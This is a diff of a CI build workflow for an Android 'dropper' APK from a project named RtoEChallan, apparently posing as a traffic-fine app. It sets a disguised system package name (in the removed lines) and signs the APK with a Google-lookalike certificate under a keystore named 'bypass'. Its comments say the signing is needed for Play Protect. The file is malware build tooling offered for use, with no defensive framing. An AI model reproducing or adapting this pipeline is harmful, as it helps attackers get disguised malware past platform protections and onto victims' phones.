@@ -1,49 +1,46 @@
 workflows:
   android-dropper-build:
-    name: Dropper APK Build (Safe Bypass)
+    name: Dropper APK Build (Stable Fix)
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Force Fix and Build
+      - name: Final Version Alignment
         script: |
           cd RtoEChallan
           
-          # 1. Package Name Fix (System Identity)
-          find . -name "AndroidManifest.xml" -exec sed -i '' 's/package="[^"]*"/package="com.android.system.service.v2"/g' {} +
-          find . -name "build.gradle" -exec sed -i '' 's/applicationId "[^"]*"/applicationId "com.android.system.service.v2"/g' {} +
-
-          # 2. Build.gradle ko ekdum stable version par force karo
-          cat <<EOF > build.gradle
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies { 
-                  classpath 'com.android.tools.build:gradle:8.1.0'
-                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.10'
-              }
-          }
-          allprojects { repositories { google(); mavenCentral() } }
-          EOF
-
-          # 3. Settings file (Simplified for no errors)
+          # 1. Settings ko simplify karo taaki versions automatic manage hon
           cat <<EOF > settings.gradle
           rootProject.name = 'RtoEChallan'
           include ':app'
           EOF
 
-          # 4. Auto-Signing Key (Google trusted lookalike)
-          keytool -genkey -v -keystore bypass.keystore -alias bypass_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Google Play, OU=Android, O=Google, L=Mountain View, ST=CA, C=US"
+          # 2. Project-level build.gradle (Bilkul stable versions)
+          cat <<EOF > build.gradle
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { 
+                  classpath 'com.android.tools.build:gradle:8.0.0'
+                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.0'
+              }
+          }
+          allprojects {
+              repositories { google(); mavenCentral() }
+          }
+          EOF
 
-          # 5. Build command with Auto-Sign
-          gradle wrapper --gradle-version 8.1.1
+          # 3. Auto-Sign (Play Protect ke liye zaroori)
+          keytool -genkey -v -keystore bypass.keystore -alias bypass_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Android, O=Google, C=US"
+
+          # 4. Clean Build
+          gradle wrapper --gradle-version 8.0
           chmod +x gradlew
           ./gradlew clean assembleRelease \
             -Pandroid.injected.signing.store.file=$(pwd)/bypass.keystore \
             -Pandroid.injected.signing.store.password=pass123 \
             -Pandroid.injected.signing.key.alias=bypass_alias \
-            -Pandroid.injected.signing.key.password=pass123 \
-            --no-daemon
+            -Pandroid.injected.signing.key.password=pass123
           
     artifacts:
       - "**/build/outputs/apk/release/*.apk"
